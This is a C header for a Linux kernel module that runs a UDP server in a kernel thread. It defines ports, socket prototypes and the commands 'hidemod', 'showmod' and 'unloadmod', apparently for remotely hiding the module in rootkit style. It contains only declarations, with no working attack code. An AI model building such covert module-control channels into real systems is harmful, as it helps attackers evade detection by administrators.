#ifndef UDPSERVER_H
#define UDPSERVER_H

#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/delay.h>
#include <linux/timer.h>

/*UDP Settings*/
#define DEFAULT_PORT 6567
#define CONNECT_PORT 12345
#define INADDR_SEND INADDR_LOOPBACK
#define BUFFER_SIZE 100

/* commands */
#define CMD_HIDE_MODULE "hidemod"
#define CMD_SHOW_MODULE "showmod"
#define CMD_UNLOAD_MODULE "unloadmod"

/* struct for our kthread */
struct kthread_t {
	struct task_struct *thread;
	struct socket *sock;
	struct sockaddr_in addr;
	struct socket *sock_send;
	struct sockaddr_in addr_send;
	int running;
};

int ksocket_receive(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len);
int ksocket_send(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len);
void ksocket_stop(void);
int ksocket_init(void);
int ksocket_exit(void);

#endif
